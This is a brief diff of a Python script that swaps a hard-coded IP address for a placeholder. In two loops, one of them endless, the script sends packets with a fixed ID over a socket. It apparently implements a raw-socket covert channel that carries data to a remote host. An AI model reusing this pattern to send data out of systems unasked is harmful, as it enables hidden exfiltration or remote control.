@@ -78,7 +78,7 @@ def create_packet(id, data):
 packet_id = 1515
 packet = create_packet(packet_id, data)
 while packet:
-		sent = soc.sendto(packet, ("34.242.70.77", 1))
+		sent = soc.sendto(packet, ("[IP]", 1))
 		packet = packet[sent:]
 
 
@@ -101,5 +101,5 @@ while True:
 		pakcet_id = 1515
 		packet = create_packet(packet_id, rr)
 		while packet:
-			sent = soc.sendto(packet, ("34.242.70.77", 0))
+			sent = soc.sendto(packet, ("[IP]", 0))
 			packet = packet[sent:]
